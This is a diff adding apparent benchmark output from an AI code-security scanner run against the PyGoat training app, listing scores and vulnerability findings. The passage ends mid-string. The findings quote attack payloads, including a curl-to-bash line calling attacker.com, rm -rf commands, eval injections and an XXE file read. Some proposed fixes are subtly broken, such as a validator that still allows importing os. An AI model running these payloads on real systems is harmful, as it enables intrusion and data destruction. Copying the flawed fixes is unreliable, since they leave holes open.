@@ -1,0 +1,704 @@
+{
+  "mode": "live",
+  "arm": "raw",
+  "timestamp": "2026-06-22T14:52:35",
+  "config": {
+    "arm": "raw",
+    "demo": "/tmp/pygoat/introduction",
+    "baseline": "/Users/annenolte/autopsytest copy/benchmark/baseline",
+    "baseline_mode": "whole-file",
+    "dedupe": true,
+    "chunked": false,
+    "use_graph": true,
+    "window_lines": 400,
+    "fuzz_lines": 5,
+    "repeat": 2,
+    "include_provisional": false,
+    "temperature_note": "temperature: model default (no knob)",
+    "haiku_model": "claude-haiku-4-5-20251001",
+    "sonnet_model": "claude-sonnet-4-5-20250929"
+  },
+  "ground_truth": {
+    "scored_count": 11,
+    "scored_ids": [
+      "pygoat-sqli-login",
+      "pygoat-insecure-deser-pickle",
+      "pygoat-command-injection",
+      "pygoat-code-injection-eval",
+      "pygoat-unsafe-yaml",
+      "pygoat-sqli-injection-lab",
+      "pygoat-ssrf",
+      "pygoat-weak-hash",
+      "pygoat-xxe",
+      "pygoat-imagemath-eval",
+      "pygoat-ssti"
+    ],
+    "all_count": 11
+  },
+  "aggregate": {
+    "precision": {
+      "mean_pct": 39,
+      "std_pct": 0.8,
+      "raw_values": [
+        0.3889,
+        0.4
+      ]
+    },
+    "recall": {
+      "mean_pct": 68,
+      "std_pct": 6.4,
+      "raw_values": [
+        0.6364,
+        0.7273
+      ]
+    },
+    "f1": {
+      "mean_pct": 50,
+      "std_pct": 2.4,
+      "raw_values": [
+        0.4828,
+        0.5161
+      ]
+    }
+  },
+  "runs": [
+    {
+      "metrics": {
+        "precision": 0.3889,
+        "recall": 0.6364,
+        "f1": 0.4828,
+        "precision_pct": 39,
+        "recall_pct": 64,
+        "f1_pct": 48
+      },
+      "counts": {
+        "tp": 7,
+        "fp": 11,
+        "fn": 4,
+        "total_findings": 18
+      },
+      "matched_ids": [
+        "pygoat-code-injection-eval",
+        "pygoat-command-injection",
+        "pygoat-insecure-deser-pickle",
+        "pygoat-sqli-injection-lab",
+        "pygoat-sqli-login",
+        "pygoat-unsafe-yaml",
+        "pygoat-xxe"
+      ],
+      "missed_ids": [
+        "pygoat-imagemath-eval",
+        "pygoat-ssrf",
+        "pygoat-ssti",
+        "pygoat-weak-hash"
+      ],
+      "provisional_matched_ids": [],
+      "category_mismatches": [
+        {
+          "finding_index": 13,
+          "finding_title": "Server-Side Request Forgery in ssrf_lab2 function",
+          "finding_category": "SSRF",
+          "truth_id": "pygoat-ssti",
+          "truth_category": "SSTI"
+        }
+      ],
+      "scan_time_seconds": 144.7,
+      "target_loc": 2912,
+      "scan_time_per_kloc": 49.7,
+      "scan_time_per_vuln": 13.2,
+      "usage": {
+        "haiku_in": 0,
+        "haiku_out": 0,
+        "sonnet_in": 72010,
+        "sonnet_out": 8192,
+        "calls": 1
+      },
+      "tokens_per_kloc": 27542,
+      "findings": [
+        {
+          "severity": "CRITICAL",
+          "title": "SQL Injection in sql_lab function",
+          "category": "SQLi",
+          "locations": [
+            {
+              "file": "views.py",
+              "line": 156
+            }
+          ],
+          "raw": "## [SEVERITY: CRITICAL] SQL Injection in sql_lab function\n\n**Category:** SQLi\n\n**Location:** `views.py:156`\n\n**Attack Scenario:**\n1. Attacker navigates to the sql_lab endpoint and submits a POST request with crafted `name` and `pass` parameters\n2. The user input is concatenated directly into a raw SQL query: `\"SELECT * FROM introduction_login WHERE user='\"+name+\"' AND password='\"+password+\"'\"`\n3. Attacker uses payload like `name=admin'--` and arbitrary password to bypass authentication\n4. The ra"
+        },
+        {
+          "severity": "CRITICAL",
+          "title": "SQL Injection in injection_sql_lab function",
+          "category": "SQLi",
+          "locations": [
+            {
+              "file": "views.py",
+              "line": 868
+            }
+          ],
+          "raw": "## [SEVERITY: CRITICAL] SQL Injection in injection_sql_lab function\n\n**Category:** SQLi\n\n**Location:** `views.py:868`\n\n**Attack Scenario:**\n1. Attacker accesses the injection_sql_lab endpoint (appears to be a training lab, but still exploitable in production)\n2. Submits POST request with `name` parameter containing SQL injection payload like `admin' OR '1'='1`\n3. The concatenated query `\"SELECT * FROM introduction_sql_lab_table WHERE id='\"+name+\"'AND password='\"+password+\"'\"` executes with injec"
+        },
+        {
+          "severity": "CRITICAL",
+          "title": "Command Injection in cmd_lab function",
+          "category": "Injection",
+          "locations": [
+            {
+              "file": "views.py",
+              "line": 422
+            }
+          ],
+          "raw": "## [SEVERITY: CRITICAL] Command Injection in cmd_lab function\n\n**Category:** Injection\n\n**Location:** `views.py:422`\n\n**Attack Scenario:**\n1. Attacker accesses the cmd_lab endpoint and submits a POST request\n2. While the code attempts sanitization by removing protocol prefixes, it still concatenates user input directly into shell commands\n3. Attacker provides domain parameter like `google.com; cat /etc/passwd` or `google.com && rm -rf /`\n4. The command `\"nslookup {}\".format(domain)` or `\"dig {}\""
+        },
+        {
+          "severity": "CRITICAL",
+          "title": "Arbitrary Code Execution in cmd_lab2 function",
+          "category": "Injection",
+          "locations": [
+            {
+              "file": "views.py",
+              "line": 454
+            }
+          ],
+          "raw": "## [SEVERITY: CRITICAL] Arbitrary Code Execution in cmd_lab2 function\n\n**Category:** Injection\n\n**Location:** `views.py:454`\n\n**Attack Scenario:**\n1. Attacker navigates to cmd_lab2 endpoint and submits POST request with `val` parameter\n2. User input is passed directly to Python's `eval()` function: `output = eval(val)`\n3. Attacker provides payload like `__import__('os').system('rm -rf /')` or `__import__('subprocess').check_output('cat /etc/passwd', shell=True)`\n4. The eval() at line 456 execute"
+        },
+        {
+          "severity": "CRITICAL",
+          "title": "Arbitrary Code Execution in mitre_lab_25_api function",
+          "category": "Injection",
+          "locations": [
+            {
+              "file": "mitre.py",
+              "line": 215
+            }
+          ],
+          "raw": "## [SEVERITY: CRITICAL] Arbitrary Code Execution in mitre_lab_25_api function\n\n**Category:** Injection\n\n**Location:** `mitre.py:215`\n\n**Attack Scenario:**\n1. Attacker sends POST request to `/mitre/25/lab/api` endpoint\n2. Submits `expression` parameter with malicious Python code like `__import__('os').system('whoami')`\n3. The code `result = eval(expression)` at line 216 executes the attacker's payload\n4. Full Python environment access allows system command execution, file access, database manipul"
+        },
+        {
+          "severity": "CRITICAL",
+          "title": "Command Injection in mitre_lab_17_api function",
+          "category": "Injection",
+          "locations": [
+            {
+              "file": "mitre.py",
+              "line": 240
+            }
+          ],
+          "raw": "## [SEVERITY: CRITICAL] Command Injection in mitre_lab_17_api function\n\n**Category:** Injection\n\n**Location:** `mitre.py:240`\n\n**Attack Scenario:**\n1. Attacker sends POST request to `/mitre/17/lab/api` endpoint\n2. Submits `ip` parameter with payload like `127.0.0.1; curl attacker.com/shell.sh | bash`\n3. The code concatenates user input: `command = \"nmap \" + ip` at line 239\n4. subprocess.Popen executes with `shell=True` at line 232, allowing command injection\n5. Arbitrary commands execute, leadin"
+        },
+        {
+          "severity": "CRITICAL",
+          "title": "Arbitrary Code Execution in a9_lab2 function",
+          "category": "Injection",
+          "locations": [
+            {
+              "file": "views.py",
+              "line": 546
+            }
+          ],
+          "raw": "## [SEVERITY: CRITICAL] Arbitrary Code Execution in a9_lab2 function\n\n**Category:** Injection\n\n**Location:** `views.py:546`\n\n**Attack Scenario:**\n1. Attacker accesses `/a9_lab2` endpoint and uploads an image file\n2. Submits malicious `function` parameter like `__import__('os').system('cat /etc/passwd')`\n3. User input is passed to PIL's ImageMath.eval(): `output = ImageMath.eval(function_str,img = img, b=b, r=r, g=g)` at line 542\n4. ImageMath.eval uses Python's eval() internally, executing the at"
+        },
+        {
+          "severity": "CRITICAL",
+          "title": "Unsafe Deserialization in a9_lab function",
+          "category": "Injection",
+          "locations": [
+            {
+              "file": "views.py",
+              "line": 527
+            }
+          ],
+          "raw": "## [SEVERITY: CRITICAL] Unsafe Deserialization in a9_lab function\n\n**Category:** Injection\n\n**Location:** `views.py:527`\n\n**Attack Scenario:**\n1. Attacker uploads a malicious YAML file to `/a9_lab` endpoint\n2. YAML file contains Python object serialization payload using `!!python/object/apply` tags\n3. The code loads the file with unsafe loader: `data = yaml.load(file,yaml.Loader)` at line 531\n4. Arbitrary Python objects are instantiated and code is executed during deserialization\n5. System compr"
+        },
+        {
+          "severity": "CRITICAL",
+          "title": "Arbitrary Code Execution in log_function_checker function",
+          "category": "Injection",
+          "locations": [
+            {
+              "file": "apis.py",
+              "line": 67
+            }
+          ],
+          "raw": "## [SEVERITY: CRITICAL] Arbitrary Code Execution in log_function_checker function\n\n**Category:** Injection\n\n**Location:** `apis.py:67-72`\n\n**Attack Scenario:**\n1. Attacker sends POST request to `/2021/discussion/A9/api` endpoint\n2. Submits arbitrary Python code in `log_code` or `api_code` parameters\n3. Code writes user input to files: `playground/A9/main.py` and `playground/A9/api.py`\n4. These modules are immediately imported and executed when subsequent requests hit the A9 endpoints\n5. Attacker"
+        },
+        {
+          "severity": "CRITICAL",
+          "title": "Arbitrary File Write in A6_disscussion_api_2 function",
+          "category": "Injection",
+          "locations": [
+            {
+              "file": "apis.py",
+              "line": 132
+            }
+          ],
+          "raw": "## [SEVERITY: CRITICAL] Arbitrary File Write in A6_disscussion_api_2 function\n\n**Category:** Injection\n\n**Location:** `apis.py:132`\n\n**Attack Scenario:**\n1. Attacker sends POST request to `/2021/discussion/A6/api2` endpoint\n2. Submits malicious Python code in `code` parameter\n3. Code is written to `playground/A6/utility.py` without validation\n4. This module is imported by other parts of the application (apis.py line 10: `from introduction.playground.A6.utility import check_vuln`)\n5. Malicious co"
+        },
+        {
+          "severity": "CRITICAL",
+          "title": "Arbitrary File Write in ssrf_code_converter function",
+          "category": "Injection",
+          "locations": [
+            {
+              "file": "utility.py",
+              "line": 36
+            }
+          ],
+          "raw": "## [SEVERITY: CRITICAL] Arbitrary File Write in ssrf_code_converter function\n\n**Category:** Injection\n\n**Location:** `utility.py:36`\n\n**Attack Scenario:**\n1. Attacker sends POST request to `/api/ssrf` endpoint with crafted `python_code` parameter\n2. The ssrf_code_converter function processes the code and writes to `playground/ssrf/main.py`\n3. Malicious code is written without proper validation (only basic string manipulation)\n4. The ssrf module is imported elsewhere: `from introduction.playgroun"
+        },
+        {
+          "severity": "HIGH",
+          "title": "Path Traversal in ssrf_lab function",
+          "category": "Path Traversal",
+          "locations": [
+            {
+              "file": "views.py",
+              "line": 942
+            }
+          ],
+          "raw": "## [SEVERITY: HIGH] Path Traversal in ssrf_lab function\n\n**Category:** Path Traversal\n\n**Location:** `views.py:942`\n\n**Attack Scenario:**\n1. Attacker submits POST request to `/ssrf_lab` with `blog` parameter like `../../../../etc/passwd`\n2. The code constructs a file path: `filename = os.path.join(dirname, file)` without validation\n3. Opens and reads the file: `file = open(filename,\"r\")` followed by `data = file.read()`\n4. File contents are returned in the response, allowing arbitrary file read\n"
+        },
+        {
+          "severity": "HIGH",
+          "title": "Path Traversal in ssrf_lab function (playground module)",
+          "category": "Path Traversal",
+          "locations": [
+            {
+              "file": "playground/ssrf/main.py",
+              "line": 7
+            }
+          ],
+          "raw": "## [SEVERITY: HIGH] Path Traversal in ssrf_lab function (playground module)\n\n**Category:** Path Traversal\n\n**Location:** `playground/ssrf/main.py:7`\n\n**Attack Scenario:**\n1. Attacker calls ssrf_lab function (from APIs or other modules) with path traversal payload like `../../settings.py`\n2. The os.path.join(dirname, file) concatenates without validation\n3. File is opened and read: `file = open(filename,\"r\")` followed by `data = file.read()`\n4. Sensitive file contents returned to attacker\n5. Can "
+        },
+        {
+          "severity": "HIGH",
+          "title": "Server-Side Request Forgery in ssrf_lab2 function",
+          "category": "SSRF",
+          "locations": [
+            {
+              "file": "views.py",
+              "line": 980
+            }
+          ],
+          "raw": "## [SEVERITY: HIGH] Server-Side Request Forgery in ssrf_lab2 function\n\n**Category:** SSRF\n\n**Location:** `views.py:980`\n\n**Attack Scenario:**\n1. Attacker sends POST request to `/ssrf_lab2` with malicious `url` parameter\n2. Submits internal URL like `http://127.0.0.1:8000/admin/` or `http://169.254.169.254/latest/meta-data/` (AWS metadata)\n3. The code makes request: `response = requests.get(url)` without validation at line 982\n4. Internal services are accessed, cloud metadata endpoints queried, o"
+        },
+        {
+          "severity": "HIGH",
+          "title": "XXE (XML External Entity) Injection in xxe_parse function",
+          "category": "Injection",
+          "locations": [
+            {
+              "file": "views.py",
+              "line": 253
+            }
+          ],
+          "raw": "## [SEVERITY: HIGH] XXE (XML External Entity) Injection in xxe_parse function\n\n**Category:** Injection\n\n**Location:** `views.py:253`\n\n**Attack Scenario:**\n1. Attacker sends POST request to `/xxe_parse` with malicious XML payload\n2. XML contains external entity declaration: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><text>&xxe;</text>`\n3. Parser is configured with `parser.setFeature(feature_external_ges, True)` at line 254, explicitly enabling XXE\n4. The parser processes external "
+        },
+        {
+          "severity": "HIGH",
+          "title": "Unsafe Pickle Deserialization in insec_des_lab function",
+          "category": "Injection",
+          "locations": [
+            {
+              "file": "views.py",
+              "line": 210
+            }
+          ],
+          "raw": "## [SEVERITY: HIGH] Unsafe Pickle Deserialization in insec_des_lab function\n\n**Category:** Injection\n\n**Location:** `views.py:210`\n\n**Attack Scenario:**\n1. Attacker obtains a valid session and cookie from insec_des_lab endpoint\n2. Crafts malicious pickled object containing code execution payload using __reduce__ method\n3. Base64-encodes the malicious pickle and sets it as the 'token' cookie\n4. On next request, server executes: `admin = pickle.loads(token)` at line 210\n5. Malicious pickle execute"
+        },
+        {
+          "severity": "HIGH",
+          "title": "Reflected XSS in xss_lab function",
+          "category": "XSS",
+          "locations": [
+            {
+              "file": "views.py",
+              "line": 96
+            }
+          ],
+          "raw": "## [SEVERITY: HIGH] Reflected XSS in xss_lab function\n\n**Category:** XSS\n\n**Location:** `views.py:96`\n\n**Attack Scenario:**\n1. Attacker crafts URL like `/xssL?q=<script>alert(document.cookie)</script>`\n2. User clicks malicious link (via phishing, forum post, etc.)\n3. The GET parameter 'q' is retrieved and rendered directly in template: `return render(request,'Lab/XSS/xss_lab.html', {'query': q})`\n4. If the template doesn't escape the query variable, JavaScript executes in victim's browser\n5. Att"
+        },
+        {
+          "severity": "HIGH",
+          "title": "Weak Cryptography - MD5 Password Storage in CF_user model",
+          "category": "Secrets Exposure",
+          "locations": [
+            {
+              "file": "migrations/0017_cf_user.py",
+              "line": 22
+            },
+            {
+              "file": "views.py",
+              "line": 1048
+            }
+          ],
+          "raw": "## [SEVERITY: HIGH] Weak Cryptography - MD5 Password Storage in CF_user model\n\n**Category:** Secrets Exposure\n\n**Location:** `migrations/0017_cf_user.py:22-26`\n\n**Attack Scenario:**\n1. Attacker gains access to database (via SQLi, backup file, or compromised credentials)\n2. CF_user table contains passwords hashed with MD5: 'alex' \u2192 '9d6edee6ce9312981084bd98eb3751ee'\n3. Attacker uses rainbow tables or GPU cracking to reverse MD5 hashes in seconds\n4. Plain passwords like 'alex123' are recovered and"
+        }
+      ],
+      "raw_output": "# Security Analysis Report\n\n## [SEVERITY: CRITICAL] SQL Injection in sql_lab function\n\n**Category:** SQLi\n\n**Location:** `views.py:156`\n\n**Attack Scenario:**\n1. Attacker navigates to the sql_lab endpoint and submits a POST request with crafted `name` and `pass` parameters\n2. The user input is concatenated directly into a raw SQL query: `\"SELECT * FROM introduction_login WHERE user='\"+name+\"' AND password='\"+password+\"'\"`\n3. Attacker uses payload like `name=admin'--` and arbitrary password to bypass authentication\n4. The raw query `login.objects.raw(sql_query)` executes the attacker's injected SQL\n5. Attacker gains unauthorized access to any user account, can extract database contents, or execute arbitrary SQL commands\n\n**Blast Radius:**\nThis vulnerability affects the `sql_lab` function in views.py and can compromise the entire `introduction_login` table. Any code path that accepts user input for authentication in this module is at risk. The raw SQL execution at line 161 (`val=login.objects.raw(sql_query)`) is the direct exploitation point.\n\n**Fix:**\n```python\n# Before:\nsql_query = \"SELECT * FROM introduction_login WHERE user='\"+name+\"' AND password='\"+password+\"'\"\nval=login.objects.raw(sql_query)\n\n# After:\nval = login.objects.filter(user=name, password=password)\n# Or use parameterized query:\nsql_query = \"SELECT * FROM introduction_login WHERE user=%s AND password=%s\"\nval = login.objects.raw(sql_query, [name, password])\n```\n\n---\n\n## [SEVERITY: CRITICAL] SQL Injection in injection_sql_lab function\n\n**Category:** SQLi\n\n**Location:** `views.py:868`\n\n**Attack Scenario:**\n1. Attacker accesses the injection_sql_lab endpoint (appears to be a training lab, but still exploitable in production)\n2. Submits POST request with `name` parameter containing SQL injection payload like `admin' OR '1'='1`\n3. The concatenated query `\"SELECT * FROM introduction_sql_lab_table WHERE id='\"+name+\"'AND password='\"+password+\"'\"` executes with injected commands\n4. Attacker bypasses authentication or extracts sensitive data from the sql_lab_table\n5. The raw query execution at line 881 (`user = sql_lab_table.objects.raw(sql_query)`) completes the attack\n\n**Blast Radius:**\nAffects the `injection_sql_lab` function and compromises the `introduction_sql_lab_table`. This appears to be a deliberate vulnerability for training purposes, but if deployed in production, it exposes real user credentials including the admin account with MD5-hashed password \"65079b006e85a7e798abecb99e47c154\".\n\n**Fix:**\n```python\n# Before:\nsql_query = \"SELECT * FROM introduction_sql_lab_table WHERE id='\"+name+\"'AND password='\"+password+\"'\"\nuser = sql_lab_table.objects.raw(sql_query)\n\n# After:\nuser = sql_lab_table.objects.filter(id=name, password=password)\n# Or parameterized:\nsql_query = \"SELECT * FROM introduction_sql_lab_table WHERE id=%s AND password=%s\"\nuser = sql_lab_table.objects.raw(sql_query, [name, password])\n```\n\n---\n\n## [SEVERITY: CRITICAL] Command Injection in cmd_lab function\n\n**Category:** Injection\n\n**Location:** `views.py:422`\n\n**Attack Scenario:**\n1. Attacker accesses the cmd_lab endpoint and submits a POST request\n2. While the code attempts sanitization by removing protocol prefixes, it still concatenates user input directly into shell commands\n3. Attacker provides domain parameter like `google.com; cat /etc/passwd` or `google.com && rm -rf /`\n4. The command `\"nslookup {}\".format(domain)` or `\"dig {}\".format(domain)` is executed via `subprocess.Popen(command, shell=True, ...)` at line 430\n5. Arbitrary system commands execute with application privileges, leading to full system compromise\n\n**Blast Radius:**\nThe cmd_lab function executes arbitrary shell commands via subprocess.Popen with shell=True. This allows complete system takeover. Any file accessible to the web application user can be read, modified, or deleted. The system can be used as a pivot point for further attacks.\n\n**Fix:**\n```python\n# Before:\ncommand = \"dig {}\".format(domain)\nprocess = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n\n# After:\nimport shlex\ndomain_safe = shlex.quote(domain)\ncommand = [\"dig\", domain_safe]\nprocess = subprocess.Popen(command, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n# Or better: use a Python DNS library instead of shelling out\n```\n\n---\n\n## [SEVERITY: CRITICAL] Arbitrary Code Execution in cmd_lab2 function\n\n**Category:** Injection\n\n**Location:** `views.py:454`\n\n**Attack Scenario:**\n1. Attacker navigates to cmd_lab2 endpoint and submits POST request with `val` parameter\n2. User input is passed directly to Python's `eval()` function: `output = eval(val)`\n3. Attacker provides payload like `__import__('os').system('rm -rf /')` or `__import__('subprocess').check_output('cat /etc/passwd', shell=True)`\n4. The eval() at line 456 executes arbitrary Python code with full application privileges\n5. Complete system compromise: file system access, credential theft, reverse shell establishment\n\n**Blast Radius:**\nThis is the most severe vulnerability in the codebase. The eval() function at line 456 allows execution of arbitrary Python code. Attacker can import any module, execute system commands, access the database directly, read SECRET_KEY from settings, or establish persistent backdoors.\n\n**Fix:**\n```python\n# Before:\noutput = eval(val)\n\n# After:\n# If mathematical expression evaluation is needed:\nimport ast\ndef safe_eval(node):\n    if isinstance(node, ast.Num):\n        return node.n\n    elif isinstance(node, ast.BinOp):\n        return operators[type(node.op)](safe_eval(node.left), safe_eval(node.right))\n    else:\n        raise ValueError('Unsupported operation')\n        \ntree = ast.parse(val, mode='eval')\noutput = safe_eval(tree.body)\n# Or remove this functionality entirely if not essential\n```\n\n---\n\n## [SEVERITY: CRITICAL] Arbitrary Code Execution in mitre_lab_25_api function\n\n**Category:** Injection\n\n**Location:** `mitre.py:215`\n\n**Attack Scenario:**\n1. Attacker sends POST request to `/mitre/25/lab/api` endpoint\n2. Submits `expression` parameter with malicious Python code like `__import__('os').system('whoami')`\n3. The code `result = eval(expression)` at line 216 executes the attacker's payload\n4. Full Python environment access allows system command execution, file access, database manipulation\n5. Attacker establishes persistence or exfiltrates sensitive data\n\n**Blast Radius:**\nIdentical to cmd_lab2 - eval() provides complete code execution. The mitre_lab_25_api function is also decorated with @csrf_exempt, making it even easier to exploit. Attacker can access all Django internals, settings, and system resources.\n\n**Fix:**\n```python\n# Before:\n@csrf_exempt\ndef mitre_lab_25_api(request):\n    if request.method == \"POST\":\n        expression = request.POST.get('expression')\n        result = eval(expression)\n        return JsonResponse({'result': result})\n\n# After:\n# Remove @csrf_exempt and use safe expression evaluator\ndef mitre_lab_25_api(request):\n    if request.method == \"POST\":\n        expression = request.POST.get('expression')\n        # Use ast.literal_eval or implement safe math evaluator\n        try:\n            result = ast.literal_eval(expression)\n            return JsonResponse({'result': result})\n        except (ValueError, SyntaxError):\n            return JsonResponse({'error': 'Invalid expression'}, status=400)\n```\n\n---\n\n## [SEVERITY: CRITICAL] Command Injection in mitre_lab_17_api function\n\n**Category:** Injection\n\n**Location:** `mitre.py:240`\n\n**Attack Scenario:**\n1. Attacker sends POST request to `/mitre/17/lab/api` endpoint\n2. Submits `ip` parameter with payload like `127.0.0.1; curl attacker.com/shell.sh | bash`\n3. The code concatenates user input: `command = \"nmap \" + ip` at line 239\n4. subprocess.Popen executes with `shell=True` at line 232, allowing command injection\n5. Arbitrary commands execute, leading to system compromise\n\n**Blast Radius:**\nThe mitre_lab_17_api function executes nmap via shell=True subprocess. The command_out helper function at line 231 takes an unsanitized command string. Any system command can be executed, files can be accessed, and the system can be compromised.\n\n**Fix:**\n```python\n# Before:\ndef command_out(command):\n    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    return process.communicate()\n\n@csrf_exempt\ndef mitre_lab_17_api(request):\n    if request.method == \"POST\":\n        ip = request.POST.get('ip')\n        command = \"nmap \" + ip\n\n# After:\nimport shlex\ndef command_out(command_list):\n    process = subprocess.Popen(command_list, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    return process.communicate()\n\n@csrf_exempt\ndef mitre_lab_17_api(request):\n    if request.method == \"POST\":\n        ip = request.POST.get('ip')\n        # Validate IP address format\n        import ipaddress\n        try:\n            ipaddress.ip_address(ip)\n            command = [\"nmap\", ip]\n            res, err = command_out(command)\n        except ValueError:\n            return JsonResponse({'error': 'Invalid IP'}, status=400)\n```\n\n---\n\n## [SEVERITY: CRITICAL] Arbitrary Code Execution in a9_lab2 function\n\n**Category:** Injection\n\n**Location:** `views.py:546`\n\n**Attack Scenario:**\n1. Attacker accesses `/a9_lab2` endpoint and uploads an image file\n2. Submits malicious `function` parameter like `__import__('os').system('cat /etc/passwd')`\n3. User input is passed to PIL's ImageMath.eval(): `output = ImageMath.eval(function_str,img = img, b=b, r=r, g=g)` at line 542\n4. ImageMath.eval uses Python's eval() internally, executing the attacker's code\n5. Complete system access achieved through arbitrary Python code execution\n\n**Blast Radius:**\nThe a9_lab2 function uses PIL.ImageMath.eval which internally calls Python's eval(). This provides the same level of arbitrary code execution as direct eval() usage. The function is authenticated but @csrf_exempt would make it easier to exploit if added. File uploads combined with code execution create severe risk.\n\n**Fix:**\n```python\n# Before:\nfunction_str = request.POST.get(\"function\")\noutput = ImageMath.eval(function_str,img = img, b=b, r=r, g=g)\n\n# After:\n# Restrict to safe operations or use a whitelist\nALLOWED_OPERATIONS = ['convert', 'add', 'subtract', 'multiply', 'divide']\nfunction_str = request.POST.get(\"function\")\n# Validate function_str contains only allowed operations and channel names\nif not all(op in ALLOWED_OPERATIONS for op in extract_operations(function_str)):\n    return render(request, \"Lab/A9/a9_lab2.html\", {\"error\": \"Invalid operation\", \"error\": True})\n# Or remove ImageMath.eval and implement specific safe transformations\n```\n\n---\n\n## [SEVERITY: CRITICAL] Unsafe Deserialization in a9_lab function\n\n**Category:** Injection\n\n**Location:** `views.py:527`\n\n**Attack Scenario:**\n1. Attacker uploads a malicious YAML file to `/a9_lab` endpoint\n2. YAML file contains Python object serialization payload using `!!python/object/apply` tags\n3. The code loads the file with unsafe loader: `data = yaml.load(file,yaml.Loader)` at line 531\n4. Arbitrary Python objects are instantiated and code is executed during deserialization\n5. System compromise through gadget chains in imported modules\n\n**Blast Radius:**\nThe yaml.load with yaml.Loader allows arbitrary Python object instantiation. This can trigger code execution through existing classes in the Python environment (gadget chains). The function is authenticated but processes untrusted file uploads, making it a prime target for exploitation.\n\n**Fix:**\n```python\n# Before:\ndata = yaml.load(file,yaml.Loader)\n\n# After:\ndata = yaml.safe_load(file)  # Use SafeLoader which only constructs simple Python objects\n# Or better:\nimport yaml\nfrom yaml import CSafeLoader as SafeLoader  # Faster C implementation if available\ndata = yaml.load(file, Loader=SafeLoader)\n```\n\n---\n\n## [SEVERITY: CRITICAL] Arbitrary Code Execution in log_function_checker function\n\n**Category:** Injection\n\n**Location:** `apis.py:67-72`\n\n**Attack Scenario:**\n1. Attacker sends POST request to `/2021/discussion/A9/api` endpoint\n2. Submits arbitrary Python code in `log_code` or `api_code` parameters\n3. Code writes user input to files: `playground/A9/main.py` and `playground/A9/api.py`\n4. These modules are immediately imported and executed when subsequent requests hit the A9 endpoints\n5. Attacker achieves persistent code execution by replacing legitimate application modules\n\n**Blast Radius:**\nThe log_function_checker function writes arbitrary code to Python module files in the playground/A9/ directory. These files are imported by the application at lines like `from introduction.playground.A9.main import Log`. Any code written to these files will execute when imported, providing persistent backdoor access and complete system control.\n\n**Fix:**\n```python\n# This appears to be a code challenge/training feature\n# If this functionality is required, implement strict sandboxing:\n\n# Before:\nlog_code = request.POST.get('log_code')\nf = open(log_filename,\"w\")\nf.write(log_code)\nf.close()\n\n# After:\n# Option 1: Remove this functionality entirely\n# Option 2: Implement strict validation and sandboxing\nimport ast\ndef validate_code(code):\n    try:\n        tree = ast.parse(code)\n        # Validate AST contains only allowed operations\n        for node in ast.walk(tree):\n            if isinstance(node, (ast.Import, ast.ImportFrom, ast.Exec, ast.Eval)):\n                raise ValueError(\"Forbidden operation\")\n        return True\n    except:\n        return False\n\nif not validate_code(log_code):\n    return JsonResponse({\"message\":\"Invalid code\"},status = 400)\n# Option 3: Execute in isolated container/VM\n```\n\n---\n\n## [SEVERITY: CRITICAL] Arbitrary File Write in A6_disscussion_api_2 function\n\n**Category:** Injection\n\n**Location:** `apis.py:132`\n\n**Attack Scenario:**\n1. Attacker sends POST request to `/2021/discussion/A6/api2` endpoint\n2. Submits malicious Python code in `code` parameter\n3. Code is written to `playground/A6/utility.py` without validation\n4. This module is imported by other parts of the application (apis.py line 10: `from introduction.playground.A6.utility import check_vuln`)\n5. Malicious code executes when utility module is imported, achieving persistent compromise\n\n**Blast Radius:**\nSimilar to log_function_checker, this writes arbitrary code to a Python module that is imported by the application. The check_vuln function is called from A6_disscussion_api at line 117, so any malicious code in utility.py will execute. This provides a persistent backdoor.\n\n**Fix:**\n```python\n# Before:\ncode = request.POST.get('code')\ndirname = os.path.dirname(__file__)\nfilename = os.path.join(dirname, \"playground/A6/utility.py\")\nf = open(filename,\"w\")\nf.write(code)\nf.close()\n\n# After:\n# Option 1: Remove this functionality\n# Option 2: Validate code with AST parser (see previous fix)\n# Option 3: Execute in sandbox and never persist to disk\n# Option 4: Store in database instead of filesystem and use exec() with restricted globals\n```\n\n---\n\n## [SEVERITY: CRITICAL] Arbitrary File Write in ssrf_code_converter function\n\n**Category:** Injection\n\n**Location:** `utility.py:36`\n\n**Attack Scenario:**\n1. Attacker sends POST request to `/api/ssrf` endpoint with crafted `python_code` parameter\n2. The ssrf_code_converter function processes the code and writes to `playground/ssrf/main.py`\n3. Malicious code is written without proper validation (only basic string manipulation)\n4. The ssrf module is imported elsewhere: `from introduction.playground.ssrf import main` (apis.py line 10)\n5. When the main module is imported, attacker's code executes, achieving persistent access\n\n**Blast Radius:**\nThe utility.ssrf_code_converter function writes processed user input to a Python module file. Although it performs some string manipulation to extract code, it does not validate the code's safety. The main.py file is imported at runtime, causing execution of any malicious code. This affects the ssrf_code_checker API endpoint.\n\n**Fix:**\n```python\n# Before:\ndirname = os.path.dirname(__file__)\nfilename = os.path.join(dirname, \"playground/ssrf/main.py\")\nf = open(filename,\"w\")\nf.write(output_Code)\nf.close()\nreturn 1\n\n# After:\n# Validate code using AST parser before writing\nimport ast\ndef validate_safe_code(code):\n    try:\n        tree = ast.parse(code)\n        for node in ast.walk(tree):\n            # Only allow basic operations, no imports or system calls\n            if isinstance(node, (ast.Import, ast.ImportFrom)):\n                if any(name.name not in ['os'] for name in node.names):\n                    return False\n        return True\n    except:\n        return False\n\nif not validate_safe_code(output_Code):\n    return 0\n# Then write file...\n# Better: Don't write to filesystem at all - use exec with restricted globals\n```\n\n---\n\n## [SEVERITY: HIGH] Path Traversal in ssrf_lab function\n\n**Category:** Path Traversal\n\n**Location:** `views.py:942`\n\n**Attack Scenario:**\n1. Attacker submits POST request to `/ssrf_lab` with `blog` parameter like `../../../../etc/passwd`\n2. The code constructs a file path: `filename = os.path.join(dirname, file)` without validation\n3. Opens and reads the file: `file = open(filename,\"r\")` followed by `data = file.read()`\n4. File contents are returned in the response, allowing arbitrary file read\n5. Attacker can read application secrets, database credentials from config files, SSH keys, etc.\n\n**Blast Radius:**\nThe ssrf_lab function allows reading any file accessible to the web application user. This can expose SECRET_KEY from Django settings, database passwords, API tokens stored in environment files, or any sensitive data on the filesystem. The try/except only catches file not found, not path traversal.\n\n**Fix:**\n```python\n# Before:\nfile=request.POST[\"blog\"]\ntry :\n    dirname = os.path.dirname(__file__)\n    filename = os.path.join(dirname, file)\n    file = open(filename,\"r\")\n    data = 